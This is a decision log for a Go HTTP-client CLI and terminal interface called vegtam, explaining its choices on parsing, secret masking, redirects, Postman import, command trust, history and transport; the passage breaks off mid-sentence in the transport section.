# Decisions

Architecture decisions, oldest first. Each entry records what was decided
and why; a later entry may supersede an earlier one.

## 2026-10-18: module path, license, CLI library

- **Module path:** `github.com/vidforull/vegtam`, Go 1.27. The skeleton has
  no third-party dependencies.
- **License:** MIT.
- **CLI library:** left for the first working version. It will be either `cobra` or
  `kong`, not both. Until then `cmd/vegtam` dispatches its single `version`
  command with the standard library.

## 2026-10-18: cobra for the command line

`spf13/cobra` (with `spf13/pflag`), not `kong`.

- **Completion.** cobra generates bash, zsh, fish and PowerShell completion
  and supports dynamic completion, so `run <file>#<TAB>` can later offer the
  request names straight from the parser. kong needs a third-party add-on
  for either.
- **Explicit commands.** A command is a plain value built in code; nothing is
  derived from struct tags. That keeps help text, argument checks and exit
  codes visible in one place per command, which matters for a CLI whose
  output and exit codes are a contract for scripts and agents.
- **Familiarity.** kubectl, gh, Hugo and many others use cobra; its help
  layout and GNU-style flags are what users and contributors expect.
- **Cost.** Two small modules: pflag and mousetrap (Windows only). kong has
  none, but the difference is not worth giving up the above.

Flags are GNU style: `--json`, `-e dev`. The single-dash long form the
skeleton accepted (`-json`) is gone. `--json` is a global flag. Commands
live in `internal/cli`; `cmd/vegtam` only wires up the process.

## 2026-10-18: strict parsing, secrets by reference, redirects

- **Strict .http parsing.** A line or directive outside the supported
  subset is an error with file and line, not skipped. A skipped
  `# @no-redirect`, or a response handler sent as body text, changes what
  goes on the wire without telling anyone; a script or an agent can act on
  an error. Lifting a restriction later stays compatible, adding one would
  not.
- **Secrets by reference.** Resolving a request yields `core.Text`: literal
  segments and `Secret{Name}` segments. Values stay in the environment
  loader and are inserted only when `exec` builds the request for the wire.
  Requests are shown with `Text.Masked()` (`Bearer {{token}}`); text that may
  carry a value back, such as errors from the network stack and response
  headers and bodies, goes through `core.Masker` (`***`, URL- and
  JSON-escaped forms included). The first layer cannot leak what it never
  held; the second catches values that come back.
- **Redirects.** Credentials and secret-bearing headers are dropped when a
  redirect leaves the first origin (scheme, host and port) and stay dropped
  for the rest of the chain. net/http alone keeps them for subdomains and
  for another port on the same host, and it sends the previous URL, query
  secrets included, as `Referer`.
- **Requests by position.** `file.http#2` addresses the second request, so
  requests without `# @name` can be run alone. Names may not be numbers,
  which keeps the two forms apart.

## 2026-10-19: output, exit codes, masking in layers

- **One document, shaped by the argument.** `run file#ref` prints one
  result; `run file` and `run dir` print `results`, even for a single
  request. A script knows the shape before running anything, rather than
  finding out from how many requests matched.
- **Additive stability.** Every document carries `schema_version`; fields
  are only added. The JSON Schema is written by hand, with descriptions
  meant for whoever reads it, and a test checks it against the Go types
  both ways. Generating it would need either a dependency or a generator
  that loses the descriptions. Error kinds are open strings, not an enum,
  so that a new kind does not break validation against an older schema.
- **Headers as lists, bodies as strings.** Headers are `{name, value}`
  pairs, as in HAR: they keep order and repeats, which a map loses. A
  body is a string; one that is not UTF-8 is base64 with `encoding`, so
  that no byte is lost or replaced.
- **Errors in the document too.** With JSON output every error is also in
  stdout, usage errors included, so that a program reads one stream. An
  error stops only its own request, as one failing package does not stop
  `go test ./...`; the exit code is the highest among the requests. A
  file that does not parse is one result, so that `run --dry-run` over a
  whole collection reports every problem at once.
- **Masking in three layers.** (1) `exec` errors never hold a secret
  value: net/http quotes the URL it was sending to, so it is replaced with
  the masked URL and any value left is masked. (2) `output` builds every
  document masked. This layer is required, not a convenience: a base64
  body and a value cut off by `--max-body` cannot be recognised later.
  (3) Everything the CLI prints, text and JSON, stdout and stderr, goes
  through the masker of the environment loader once more, so that a
  missed path still cannot print a value. JSON is masked in its decoded
  string values, which keeps the document valid; a JSON response body is
  masked that way too, which catches any escaping a server uses. Every request of a run
  is resolved before the first is sent, so the masker knows every secret
  before anything is printed. Masking by value over-masks short values;
  that is the price of never printing one.
- **Text for terminals only.** Text output shows control characters in
  responses and error messages as `\xNN`: what a server sends is
  untrusted and must not drive the terminal.

## 2026-10-19: importing from Postman

- **A .http file per folder.** A folder's own requests go to one file
  named after it, its subfolders to a directory of the same name next to
  it; a collection is a directory. A .http file holds several requests,
  so a folder stays one unit (`run products.http`) in Postman's order,
  and the tree is no deeper than the collection. A file per request
  would give as many files as requests and lose the order within a
  folder.
- **Environment files per collection.** vegtam uses the nearest file of
  each kind and does not combine it with files higher up, so a shared
  file at the top could not hold collection variables. Each collection
  directory gets its own two files with every Postman environment in
  them, as any environment applies to any collection in Postman; the
  directory runs and moves on its own. The private file is written even
  when empty, so that one in a directory above cannot take its place. An export without environments
  gets an empty `default`, because `-e` needs one to select.
- **Secret by name, across the export.** A variable that Postman marks
  as secret, that is named like a secret, or that auth refers to is
  secret everywhere in the export, and all its values go to the private
  file. vegtam ranks private `$shared` above the public environment, so a
  variable split between the two files could take a collection value
  over an environment one; kept in one file, Postman's order of globals,
  collection and environment holds. Literal values where secrets go
  (auth, and headers, query parameters, form fields and JSON body fields
  named like secrets), including text around placeholders, move to new
  variables, the same value to the same variable. Like masking, detection by name rather catches too much than
  too little; it cannot see a secret under an ordinary name.
- **Parsed back, else commented out.** Every request goes through the
  parser that will read it. One that would not read back as meant stays
  in its file as comments with the reason, so that nothing is lost, the
  file parses, and the report counts it.
- **Scripts are reported, not converted.** Running Postman's JavaScript
  would take an engine and would run code from an export; translating it
  would be guesswork. Only the status a test checks for carries over,
  as `# @assert`.
- **Writing.** The importer only builds files; the command writes them
  through an `os.Root`, so neither a name from the export nor a symbolic
  link in the output directory leads outside `-o`. Without `--force` it
  writes nothing if any file exists, rather than half an import.

## 2026-10-19: assertions and captures

- **gojq for paths, plain paths only.** `github.com/itchyny/gojq`, used
  as a library, is the one new dependency (with its `timefmt-go`). jq
  syntax is widely known, gojq is pure Go and compares numbers exactly,
  so a large integer in a body is not rounded. A path is written with a
  leading `$`, as in JSONPath (`$.items[0].id`), and parsed as
  `.items[0].id`; gojq's syntax tree must then be a plain path of names,
  quoted keys and integer indexes, with at most a final `|length`. A full
  jq program could turn a secret into a slice, a character, its base64
  or its lower case, which masking by value cannot recognise. For the
  same reason gojq only computes the keys of the path, with `path()`; the
  value is looked up in the decoded body by vegtam, in objects and arrays
  only, since gojq would also index into strings. gojq's error messages
  quote part of the value they fail on, so they are replaced with
  vegtam's own, which quote nothing.
- **Small, strict grammar.** `@assert` knows status, header, body,
  jsonpath and duration checks, and nothing else; a check outside it is
  a parse error when the file is read, so `--dry-run` finds it. A
  general expression language would be a scripting language by another
  name, which this stage does not have.
- **A failed assertion is a result, not a failed request.** It has its
  own exit code, 1, the lowest after success: the request was sent, and
  its response is in the output for whoever looks into the failure.
  Every assertion is evaluated, so one run reports them all. Actual
  values are masked as the response is, a body as a body and a path's
  value as JSON, so that every escaped form is found, and only then cut
  at 200 bytes; error messages name only the expressions, since a cut
  body could split a secret where masking cannot see it.
- **Captured values are secrets by default.** What one takes from a
  response is mostly a token or a session id. A capture left unmarked
  then masks a value that did not need it, which is visible and easy to
  fix with `plain`; the other default would print a token in every
  later response and error. Masking starts with the response the value
  comes from. A secret capture takes a string, number or boolean, not an
  object or array: masking would know the compact JSON of it, not the
  values inside as the body writes them.
- **Captures by position in the run.** A variable is captured for the
  requests after its directive, in the order `run` sends them, and takes
  precedence over the environment. Requests are still resolved before
  the first is sent, so that the masker knows the other secrets; a
  captured variable is then a secret segment marked as captured, and its
  value is looked up when the request is sent. Whether `{{token}}` means
  the environment's or the captured value is decided by where the
  request is in the run, not by when it is sent. A capture that takes
  nothing leaves its variable without a value: an older token, or the
  environment's, would be sent without anyone noticing. For the same
  reason a file that does not parse still declares the variables its
  `@capture` lines name, found line by line, and a request captures a
  variable once at most.
- **Dry runs and late values.** A dry run sends nothing and so captures
  nothing. Its captured variables are late (`core.ErrLate`): shown as
  placeholders, and the URL or header holding one is left unchecked. A
  stand-in value would make a URL such as `{{next}}`, captured from a
  `Location` header, fail the check for no reason.

## 2026-10-19: secrets from commands, trust as the first policy

- **Commands, not a plugin system.** `{{$cmd NAME}}` gets a secret from
  any tool that prints it (`op`, `pass`, `security`, `vault`), with no
  code in vegtam for each; the keychain integration planned later can
  sit next to it. The command file holds how to get secrets, never the
  secrets, so it can be committed with the requests.
- **No shell.** Commands are argv lists run with os/exec. A shell would
  bring quoting, expansion and injection along with it; anyone who wants
  a pipeline can write a script and name it in argv. The working
  directory is the command file's, so that a relative script path means
  the same for every `.http` file that uses it.
- **Run once, before sending.** A command runs while requests are
  resolved, once per run, so that the masker knows its value before
  anything is printed and a prompt from a password manager comes once.
  A dry run and `show` run nothing.
- **Trust like direnv.** A file of commands is code. `vegtam trust`
  records where it is and a SHA-256 in the user's config directory,
  outside any collection, so a cloned repository, a pulled change or an
  edited file runs nothing until a person has looked at it. The sum
  covers the file and the files its commands name by relative paths,
  since a script next to the file is as much code as the file; programs
  from `PATH` or absolute paths are the system's. The key is where the
  file is found, only its directory's links resolved, so that a link
  elsewhere to a trusted file does not borrow its trust. The command
  file's bytes that are hashed are the bytes parsed and run; a script it
  names is hashed just before it runs. The store is written to a new
  file and renamed, readable by its owner only, and ignored if it or its
  directory belongs to someone else or others can write it.
- **Policy has its own exit code.** An untrusted file is not a malformed
  request: a program has to tell "fix the file" (2) from "a person must
  allow this" (6). Trust is the first piece of the policy planned for
  vegtam; confirmation of unsafe methods and host allowlists will
  join it under the same kind and codes.

## 2026-10-19: the quality gate

- **Body files stay beside the request.** A `< path` body is read
  through an `os.Root` of the `.http` file's directory, so `..`, an
  absolute path or a symbolic link cannot lead out of it. A collection is
  often someone else's: without this, a cloned `.http` file could send
  `~/.ssh/id_ed25519` as a body to its own host. `filepath.Join` and
  `Clean` are no boundary, they only rewrite the path. JetBrains allows
  any path; payloads kept beside the collection have to move below it.
- **Redirects keep secrets and TLS.** A redirect from https to http is
  refused, secrets or not: the request was written for TLS, and what
  the server sends back, a cookie or a token, would cross in clear. A
  307 or 308 to another origin is refused when the body holds a
  secret: net/http sends the body again, and unlike a header it cannot
  be dropped. A 301, 302 or 303 turns the request into a GET without a
  body and is followed as before.
- **Files are written whole.** Import writes each file to a new file
  beside it, syncs and closes it, checking both, and renames it over the
  old one; the trust store did so already and now syncs too. A failed or
  interrupted write leaves the old file, never half of the new one, and
  a private file replaced this way gets 0600 even if the old one was
  0644. The directories vegtam makes are 0700: each collection holds a
  private environment file.
- **A panic is masked too.** Go prints a panic's value as is, and a bug
  could panic with a secret or an escape sequence in it. `cli.Run`
  recovers and prints the value and the stack as terminal text, masked
  with every secret the environment loader has read so far, which may be
  before the command has its own masker. It exits with 2, the code Go
  gives, so that the exit codes do not change. `import` reads no
  environment: the values of an export are data it writes, and a panic
  there is masked with nothing. The secret-output test covers panics,
  and a redirect error that names a URL other than the request's.
- **Terminal text is UTF-8.** Text output already showed control
  characters as `\xNN`; bytes that are not UTF-8 are now shown the same
  way. A lone 0x9b is the 8-bit form of CSI, which a terminal that does
  not read UTF-8 takes as the start of an escape sequence. Fuzzing the
  function found this at once, with the property every terminal string
  must have: valid UTF-8, no control characters but tab and line feed.
- **One gate, run by make.** `make check-fast` and `make check` are what
  "done" means for a change, for people and scripts alike; there is no
  CI yet. Rules a contributor has to remember are kept to what no tool
  checks, and each of those has a test (CONTRIBUTING.md lists them).
  The gate's own files change only in pull requests of their own, and
  suppressions are counted against a baseline from `origin/main`.
- **Set for the defects it must catch.** The linters are configured to
  catch an unclosed response body, a shadowed `err`, an empty
  `default:` hiding an enum case, and `defer f.Close()` on a file open
  for writing. A data race and a secret in an error are for the tests to
  catch, under the race detector and in the secret-output tests: no
  linter sees them. Hence:
  - govet's **shadow** is on: a shadowed `err` can lose an error, that
    of a rename for one, and the other linters let it through. A
    shadowed `err` is fixed with `=`.
  - errcheck runs **without the std-error-handling preset**, which lets
    `(*os.File).Close` through, and with it the write error that
    `defer f.Close()` loses on a file open for writing. Closes of
    interface values, writes through an `io.Writer` or into a
    tabwriter, and cleanup removals stay excluded; a write to or the
    Close of an `*os.File` is checked.
  - exhaustive keeps **`default-signifies-exhaustive: false`**: with
    `true` an empty `default:` would hide a missing case from it.
    Switches list every case; gojq's term types are ignored, as vegtam
    refuses all but a few in a `default`.
  - gosec **G115** stays on: an integer conversion from input gets a
    bounds check where it happens.
- **Smaller choices.** misspell has no locale, since the prose here
  is British. gocognit (30) skips tests, which are scripts of checks.
  sloglint waits for the first slog call. os/exec is allowed in
  `internal/core/env/cmd.go` only, and the process environment is read
  in two places, `{{$env NAME}}` and the trust store location. The
  points that open files by path carry a `//nolint` with the reason
  rather than an exclusion by file, so that a new one in the same file
  is still reported.
- **Write errors on stdout stay unreported.** As `writeJSON` already
  decided, a failed write to stdout or stderr has nowhere to go; errcheck
  excludes `fmt.Fprint*` to an `io.Writer` for that reason.
- **goleak when there is a goroutine.** vegtam's code starts none; the
  first package that does adds `goleak.VerifyTestMain`, and
  `go.uber.org/goleak` becomes a dependency of its tests only.
- **Fuzzing.** The parser, templates, masking and terminal text have fuzz
  targets with properties rather than examples. Their seeds are in the
  tests, and the parser's are the `.http` files in testdata; inputs that
  once failed are kept in `testdata/fuzz` and run with every `go test`.

## 2026-10-19: the terminal interface

- **Bubble Tea v2, Bubbles v2, Lip Gloss v2.** `charm.land/bubbletea/v2`
  v2.1.0, `charm.land/bubbles/v2` v2.2.1 and `charm.land/lipgloss/v2`
  v2.0.6, all MIT. v2 is the maintained line: the view is a value that
  declares the alternate screen rather than commands that toggle it, the
  keyboard is read correctly on more terminals, and Lip Gloss leaves
  colours to the program, which knows its terminal. The modules are at
  `charm.land`, not `github.com/charmbracelet`: their `go.mod` declares
  that path, and Go refuses the other. `charmbracelet/x/term`, which Bubble
  Tea brings along, tells `cmd/vegtam` whether stdin and stdout are
  terminals.
- **From Bubbles: viewport, key and help.** The request and response
  panes are viewports, with soft wrap; the keys are `key.Binding`s, which
  `help` lists on `?` and in the status line. The tree is a column of
  lines of vegtam's own: Bubbles' list brings fuzzy filtering, paging and
  a delegate API, more than it needs before there is a search. teatest is
  not used either: its v2 is an untagged module of `x/exp`. The tests call
  Update and View, and one runs the program on a pipe.
- **One way to send.** The interface holds no request logic.
  `internal/core/session` prepares and sends requests for it as for
  `run` and `show`. A session lasts while one environment is chosen, so a
  value an `@capture` takes is a variable for the requests sent after it,
  in the order a person sends them; choosing another environment starts
  a new session. The middle pane shows the selected request as written
  without an environment, and with one as a dry run that declares what the
  session has captured: `{{token}}` after a sign-in is a placeholder, not
  unresolved. Before each send the session reads the environment and
  command files again and runs its commands again, as a new run would,
  keeping only what it captured: what goes out is what the preview showed,
  an edited file or a new `vegtam trust` counts at once, and a command
  that failed, was canceled or gave a token that has since expired runs
  anew. `{{$cmd NAME}}` runs only when a request is sent.
- **Masked before laid out.** Every string a view holds, a body as much
  as a file or an environment name, is masked with the secrets of the
  sessions its text comes from, joined with `Masker.Join`: the one that
  sends, those of earlier environments, and the dry run that previews the
  selected request. It is then shown as the CLI prints text for a
  terminal (control characters, escape sequences and bytes that are not
  UTF-8 as `\xNN`), and only then laid out by Lip Gloss. A line cut to
  its pane cannot leave half a secret behind, and a server cannot drive
  the terminal. The response is masked again when it changes, not at
  every key: a large body would slow every key down. Bubble Tea writes to
  the terminal itself, not through the CLI's masked writer: it draws the
  screen in pieces, which masking each write could not follow.
- **One request in flight, with an owner.** A request runs on a
  goroutine that the interface starts and `Run` waits for, with a context
  that `esc`, `q`, Ctrl-C and SIGTERM cancel; a Bubble Tea command only
  brings back its result. Bubble Tea does not wait for the commands it
  runs, and drops one it is handed while the program ends. While the
  request is in flight, its goroutine alone uses the session.
- **Panics.** Bubble Tea recovers a panic, restores the terminal and
  prints the value and the stack itself, unmasked; with `TEA_DEBUG` set it
  also writes them to a file in the working directory. The interface
  recovers first, in Update, View and the request's goroutine, quits so
  that Bubble Tea leaves the alternate screen and raw mode, and panics
  again with the value and its stack once the program has ended:
  `cli.Run` prints them masked, as any panic. Only a panic inside Bubble
  Tea itself would still take Bubble Tea's way.
- **Asking first.** `enter` sends GET, HEAD and OPTIONS at once and asks
  before any other method, which may change something on the server: the
  start of the confirmation that policy will ask of agents.
- **vegtam alone.** When stdin and stdout are terminals, `vegtam` with no
  command opens the interface on the current directory. Otherwise it
  prints the help on stderr and exits with 2: a script or an agent that
  runs it by mistake gets a usage error, not a program waiting for keys.
- **Interrupts.** SIGINT and SIGTERM cancel the root context. A request
  or a command they stop fails with kind `canceled` and exit code 130,
  128 + SIGINT, as a shell reports a process that Ctrl-C ended: neither a
  network error nor an unresolved variable, which would send a script
  looking for a fault.
- **No files.** The interface writes nothing; the history of runs, when
  it comes, will decide what it keeps and where.

## 2026-10-19: search, copy as curl, colours and folds in the interface

- **Search.** `/` narrows the list as one types, ignoring case, to the
  requests whose label, file name or URL as written contain the text,
  and to their files. It matches the URL as written, not as resolved:
  the list is of what is in the files, and matching resolved values
  would match secrets. The cursor stays on a row the list shows; with
  none, `enter` and `y` do nothing. No `n`/`N`: the list is short enough
  to move in once it is narrowed.
- **The preview is always a dry run.** Without an environment too, the
  request pane shows the request as it would be sent. If it cannot be
  resolved, the pane shows it as written over the error, so that what
  is missing is seen where it is used; before, a request without an
  environment was shown as written and no error said what it lacked. A
  variable whose `@capture` took no value is an error in the preview as
  it is when sent ("not captured"): the preview takes over from the
  session what it has lost, as it takes over what it has declared. A dry
  run of `run` loses nothing, since it captures nothing.
- **Colours after cleaning.** The request pane colours each placeholder
  by what `env.Vars.Classes` says it stands for, the same function
  `Prepare` decides with: a plain value, a secret, a capture, or nothing,
  and `***` as a secret. The styles go around parts of the text that
  `clean` has already masked, so a style cannot split a secret value from
  its mask, and the tests check the views as styled. The colours are the
  terminal's first sixteen, which Bubble Tea fits to its profile: none
  with `NO_COLOR` or `TERM=dumb`, where the placeholder, `***` and the
  error under the request still say the same.
- **The status line keeps its keys.** On a narrow terminal the
  environment and the note are cut short, with an ellipsis; the keys are
  named in a word each, and below about 75 columns only `enter`, `?` and
  `q` stay. `Ctrl-L` has Bubble Tea clear the screen and draw it again,
  for when something else, such as a server's log, wrote on the terminal.

- **Copy as curl.** `y` builds the command in the core,
  `internal/core/curl` through `Session.Curl`, from the request the dry
  run of the preview prepared. A prepared request names its secrets and
  holds no values, so the command cannot hold one: each secret is a
  shell variable named after its placeholder (`{{token}}` is `"$token"`,
  `{{$env NAME}}` and `{{$cmd NAME}}` are `"$NAME"`), a captured value
  is one too, as a dry run has none. A name that bash or zsh use, such
  as `path` or `UID`, gets a suffix, except for `{{$env NAME}}`, whose
  variable is the one vegtam reads. A comment before the command names
  the variables, and the command starts with `: "${token?}" &&`: pasted
  at once with a variable left out, it stops before curl sends a request
  with a secret missing. A secret value can still be in the text of a
  request, outside a placeholder: a public variable with the value of a
  private one, say. The masker looks for it in each piece of text before
  the piece is quoted, since quoting changes a value with a `'` in it
  past recognising; if it finds one, nothing is copied, and the note
  says where it is. Nor is anything copied if the masker finds a value
  in the command as a whole, in what curl's options add (a private value
  `raw` in `--data-raw`): the command would be wrong.
- **Secrets of earlier previews.** What a preview's dry run has read
  stays masked once the preview moves on, as what earlier environments
  read does. Before, a private value that only the preview in another
  environment or directory had read was masked only while that preview
  lasted.
- **What curl sends.** The method, URL, headers and body that vegtam
  sends, and nothing curl would add to a body of its own accord:
  `--data-raw` for a body, so that a leading `@` names no file,
  `--data-binary @./path` for a body file (`@-` would be stdin), an empty
  `Content-Type`, an empty `Expect` over 1 MiB, an empty body for POST,
  PUT and PATCH without one, as net/http sends `Content-Length: 0`,
  `--globoff`, and always `--path-as-is`, since vegtam never rewrites a
  path and curl would, `%2e%2e` too. curl's default headers, such as
  `User-Agent` and `Accept`, stay curl's. It has no `-L`: curl keeps
  custom headers such as `X-API-Key` on a redirect to another host,
  which vegtam drops. Text with a control character is written as
  `$'...'` with it escaped (bash, zsh, ksh and POSIX.1-2024; dash and fish
  do not read it), so the command holds no control character, cleaning
  it for the terminal changes nothing, and what is shown is what runs.
  Left as they are: an inline body over 128 KiB is longer than Linux
  takes as one argument, and a header whose value is a secret that is
  empty when the command runs is removed by curl, not sent empty.
- **OSC 52 is ours.** The interface removes every escape sequence from
  what it shows: no server, file or name may drive the terminal. OSC 52,
  which asks the terminal to set the clipboard, is a sequence of
  vegtam's own with content of its own: the command, masked and cleaned
  as all text is, the very string the response pane shows. Bubble Tea
  encodes it in base64, which can neither end the sequence nor start
  another. It holds no secret value, only the names of variables. A
  terminal or multiplexer that does not pass OSC 52 on loses nothing:
  the command is in the pane to select. The interface never reads the
  clipboard.
- **Folding JSON.** `z` folds the JSON body of the response from depth
  1, then from depth 2, then not at all, and the next response keeps the
  fold. One function formats JSON, `output.FormatJSON`: the CLI calls it
  through `WriteResponse` with no fold, the interface with its depth.
  The interface folds a body only once it has masked the whole of it:
  the masker sees the full document, and a fold only takes text away,
  whole objects and arrays at a time, so it cannot cut a secret value in
  two and leave a part of it to show. The rest of the cleaning for the
  terminal comes after, on the whole text, as the CLI prints it: it
  works a character at a time, so its order with a fold changes nothing
  on the screen, while before the fold it would turn DEL and C1
  characters, which JSON allows in strings, into `\x7f` and make the
  body no JSON. `FuzzFormatJSON`
  checks that any input formats without a panic, that what is not JSON
  stays as it is, and that each fold stands for a whole object or array
  with the right count.

## 2026-10-19: history of runs, and the core made harder

- **A second `enter` sends, not `y`.** The question before a method
  other than GET, HEAD or OPTIONS is answered by `enter` again; any other
  key leaves the request unsent. Since `y` copies a request as curl, a
  `y` typed from habit must not send a POST. Two presses of the same key
  are still a deliberate act: the question is in the response pane,
  with the method and the request it would send. An enter that the
  terminal reports as a repeat of a key held down, or that comes within
  half a second of the question, is not an answer, and the question
  stays: a key that bounces sends twice within milliseconds, and a key
  held down repeats only after a delay, half a second or more on most
  systems. A terminal that does not report repeats, with a shorter delay
  than that, can still send with a key held down.
- **What the history keeps.** One entry for each request sent: the
  time (UTC), the ref with the file as an absolute path (a ref that
  `vegtam run` takes from any directory), the environment, the method,
  the URL as written, the status, the time it took, the result (`ok` or
  the error kind) and whether the body was cut short. That is what the
  file says and how the run ended; neither is a secret. Nothing that a
  secret can be in is kept, in any form: no header, body or response, no
  value of a variable, no captured value, no URL as resolved. Masking
  would not make them safe, since it only finds the values it knows,
  and a history outlives the run whose secrets it knew. The URL as
  written goes through the masker all the same, for a secret value
  written into a `.http` file by hand, and a password written in it
  (`https://ada:...@host`) is kept as `***`, whether a value or a
  placeholder. A value written in the query by hand is kept as it is:
  it is in the file already, and the history is the user's own; a
  placeholder is the way to keep it out. Each text is cut after 2 KiB,
  so that a long name or URL cannot crowd the other runs out of the
  file. A request that failed before it
  went out is kept too, with its error kind: it is a run. A dry run is
  not, nor is a file that does not parse, which has no request to go
  back to, nor a request with `# @no-log`, the directive JetBrains,
  kulala and httpyac use for this.
- **JSON Lines.** A run adds one line to the end of the file, with one
  write, then syncs it: on a local disk, lines from runs at the same
  time do not mix, and a run killed while writing leaves at most one
  line without its end,
  which reading skips, as it skips any line that is not an entry.
  Reading takes lines from the end of the file, so that it costs the
  same however long the history is. Nothing has to be rewritten, which a
  single JSON document would need on every run, and `tail` and `jq` read
  it as it is. At 1 MiB the file becomes `history.jsonl.1`, replacing the
  one before: the history stays bounded with no settings. A directory
  vegtam makes is 0700, and one that others can write is refused, as
  the trust store refuses one: whoever can write it can swap the file.
  The file is 0600, made so if it was not, and opened through an
  `os.Root` of the directory, which refuses a link that leads out of
  it; a named pipe in its place is an error before it is opened. Only a
  pipe put there between that check and the open would block: that
  takes a process writing in the user's own data directory as vegtam
  runs.
- **Kept by the core.** `session.Run` adds the entry, so `run` and the
  terminal interface keep the same history the same way, and a new way
  to send would keep it too. `--no-history` keeps one run out, and
  `VEGTAM_NO_HISTORY=1` (anything but empty, as with `NO_COLOR`) every
  run: the operator's setting for agents and CI. It is a variable for
  now; the policy file of the operator, when it comes, will have it too.
  A history that cannot be written is a warning on stderr and changes
  neither the output nor the exit code: a read-only home must not make
  requests fail.
- **Where.** `$XDG_DATA_HOME/vegtam/history.jsonl`, or
  `~/.local/share/vegtam/` without it: data that vegtam makes, as the XDG
  Base Directory Specification has it, beside the trust store in the
  config directory. The process environment is still read in two files
  only, as the gate wants: `{{$env NAME}}` in `env.go`, and the operator's
  settings, the XDG directories and `VEGTAM_NO_HISTORY`, in
  `policy/trust.go`.
- **`h` lists the runs.** The interface reads the latest 200 entries
  of the history, from its end, each time `h` is pressed, so that runs
  of `vegtam run` in another terminal are there too; it reads them in a
  Bubble Tea command, not in `Update`, so that a slow disk holds up no
  key. The list takes the
  place of the tree, as the environments do, and the response pane
  shows the selected run as the history has it; `/` searches the runs as
  it searches the requests. `enter` goes to the request in the tree by
  its file and name or position, clearing a search that hides it; a run
  of a file elsewhere, or of a request since renamed, stays in the list
  and says so. Times are shown in local time; the file keeps UTC.
- **No Referer of its own on a redirect.** net/http sends the URL it
  was redirected from as the `Referer` of the next hop, query and all,
  and dropped it only on the way to another origin. A token in the
  query (`?key={{token}}`) then went to the same server again, into its
  logs as a header, and RFC 9110 (10.1.3) asks clients not to send what
  the user would not expect. vegtam drops it on every hop; a `Referer`
  written in the request is sent on as far as its origin.
- **Body files: regular, 16 MiB at most.** `< ./file` is checked with
  `Stat` through the `os.Root` of the `.http` file's directory before it
  is opened, and again once open (`os.SameFile`). Opening a named pipe
  waits for a writer, so a `.http` file from elsewhere with `< ./fifo`
  would hang the interface's preview, which reads body files as it
  resolves a request; a device such as a link to `/dev/zero`, were one
  inside the directory, would be read without end. 16 MiB is far more
  than an API request body needs, and is read whole into memory; the
  error gives the size. A file replaced by a pipe between the check and
  the open would still block: that takes a process writing in the
  directory as vegtam runs, not a file someone sent.
- **Invisible characters shown escaped.** On a terminal, the CLI and
  the interface show every character that a terminal does not show yet
  that changes how text reads, as `\uNNNN` (`\UNNNNNNNN` above U+FFFF),
  as control characters are shown as `\xNN`: the format characters,
  Unicode category Cf (the marks, embeddings, overrides and isolates of
  text direction, U+202A–U+202E, U+2066–U+2069, U+200E, U+200F;
  zero-width characters, U+200B–U+200D, U+2060; the byte order mark; the
  soft hyphen; the tag characters, U+E0000–U+E007F), the line and
  paragraph separators, the other default-ignorable characters, such as
  the Hangul fillers, and the variation selectors 17 to 256. An override
  makes `exe.txt` of `txt.exe`, and tags and selectors carry text no one
  sees. Taking whole categories and properties, rather than a list, also
  covers the ones a list would miss. The variation selectors 1 to 16 are
  left as they are: emoji use them in ordinary text. The price is an
  emoji joined with U+200D, such as a family, shown as its parts with
  `\u200d` between them. JSON output is unchanged: the escapes are for
  terminals. The CLI masks text before it escapes it, everywhere it
  prints, panics included: an escape would hide a secret value that
  holds such a character from the masker. Copy as curl writes such
  characters as `$'\xNN'` bytes, as it writes control characters, and
  names a placeholder that holds one with Go's escapes in its comment,
  so the command holds none, and cleaning it for the terminal still
  changes nothing. `FuzzPrintable` checks that no such character is left
  and that text without any is left alone.
- **Commands get no terminal.** A `{{$cmd NAME}}` that asks for a
  password at the terminal, as a password manager without its agent or
  desktop app may, cannot work under the interface: Bubble Tea reads every
  key, and the prompt would draw over the screen and wait for an answer
  it never gets. Taking the terminal from the interface for the command,
  as `tea.ExecProcess` does for an editor, would also hand the command
  a terminal under `run`, where an agent may be the one at it. So it is
  not supported, and says so: a command runs with no input, as before,
  and now, on Unix, in a session of its own (`Setsid`), which has no
  controlling terminal, so that opening `/dev/tty` fails at once. Its
  error then says that commands run with no input and no terminal, and
  must get a secret from an agent, a cache or a window of their own. The
  same holds under `run`: a command behaves the same whoever runs it. A
  program that opens the terminal by its name, as gpg-agent does through
  `GPG_TTY` for `pinentry-curses`, is beyond this: only the command's
  timeout ends its wait. In a session of its own, a command no longer
  gets the terminal's Ctrl-C, and neither would what it starts; so a
  command that is canceled or runs out of time is killed with its whole
  process group, not alone. One that ends by itself leaves behind what
  it started, such as an agent, as before.
- **The interface on small and plain terminals.** The help is a
  viewport over all panes: on a terminal smaller than 80x24 it keeps its
  frame and scrolls with the keys of the panes, and its title says so;
  on 80x24 it still fits whole, its sentences shortened to make room for
  `h`. Without styles, as Bubble Tea has it for `TERM=dumb`, reverse
  video does not show, so a `>` marks the selected line of the list, of
  the environments and of the runs. The colours of placeholders need no
  such mark: the text says as much (see above). Without an environment,
  the error of an unresolved variable says that `e` chooses one, where
  the CLI says `use -e <name>`: the session takes the hint as an option.

## 2026-10-20: transport

- **Files only tighten.** A `.http` file and its environment files come
  with the requests, often from someone else's repository, so what they
  say of the transport may only make a run stricter: a shorter timeout,
  say. Whatever weakens a defence (TLS checks turned off), belongs to the
  machine (a CA, a client certificate, a proxy) or holds a secret comes
  from a command-line flag, and later from a policy file of the
  operator's that no repository holds. A transport directive of another
  client, such as httpyac's `@no-reject-unauthorized` and `@proxy`,
  kulala's `@kulala-curl-*` or resterm's `@setting insecure`, is an
  error that names the flag to use; a directive of another client that
  does not touch the transport, such as `@note`, `@prompt`, `@sleep` or
  `@ratelimit`, is a warning, and the request runs. The `SSLConfiguration`
  that JetBrains reads from `http-client.private.env.json` is not
  applied: `verifyHostCertificate: false` is ignored with a warning, and
  its certificate paths with a hint to `--cert` and `--key`. A private
  file is meant to stay out of version control, but whoever wrote the
  requests can commit one.
- **A transport per identity.** `exec.Client` keeps a transport, with its
  own pool of connections, for each configuration it sends with: whether
  it offers the client certificate, the connect timeout and the HTTP
  version; the TLS settings are the client's, one set per run. Each is a
  clone of net/http's transport, which keeps HTTP/2, and its TLS config
  is not changed once made. Each hop of a request takes its own: the hops
  to the origin of the request as written offer the certificate, the
  others do not, and once a redirect has led elsewhere none does, as no
  secret header goes on: a redirect elsewhere, even to the same server,
  gets neither the certificate nor a connection made with it, and one
  back cannot make the client sign a request of the other origin's
  choosing. curl's CVEs of
  credentials sent where they should not go are largely of this kind.
  Two tests are gates for the whole of the transport work: no connection
  is reused across TLS identities, and no secret reaches a transport
